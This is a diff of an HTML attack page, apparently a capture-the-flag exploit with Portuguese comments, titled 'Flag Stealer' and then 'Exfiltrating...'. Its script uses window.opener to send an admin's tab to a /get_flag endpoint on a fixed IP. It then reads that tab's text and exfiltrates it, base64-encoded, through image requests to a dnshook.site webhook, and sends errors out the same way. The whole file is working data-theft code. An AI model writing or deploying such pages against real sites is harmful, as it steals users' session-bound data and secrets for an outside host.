@@ -1,33 +1,30 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Flag Stealer</title>
+    <title>Exfiltrating...</title>
   </head>
   <body>
-    <h1>Hi Admin 👋</h1>
-    <p>Just a cool page...</p>
+    <h1>Hello Admin :)</h1>
 
     <script>
-      // Verifica se a página foi aberta por outra aba
       if (window.opener) {
-        // Redireciona a aba do admin com cookie para /get_flag
+        // Redireciona a aba original com o cookie para obter a flag
         window.opener.location = "http://34.134.162.213:17001/get_flag";
 
-        // Espera um tempo para a flag carregar na aba principal
         setTimeout(() => {
           try {
-            // Tenta ler a flag da aba original
+            // Tenta capturar a flag da aba original
             const flag = window.opener.document.body.innerText;
 
-            // Exfiltra a flag para seu Webhook DNS
+            // Exfiltra usando DNS (sempre funciona)
             const img = new Image();
             img.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/" + btoa(flag);
           } catch (e) {
-            // Se falhar, exfiltra o erro para debug
+            // Em caso de erro, envia o erro para debug
             const img = new Image();
-            img.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/erro_" + btoa(e.message);
+            img.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/error_" + btoa(e.message);
           }
-        }, 2000); // tempo ajustável, pode aumentar para 3000ms se necessário
+        }, 2500); // Tempo extra pra garantir que a aba tenha carregado
       }
     </script>
   </body>
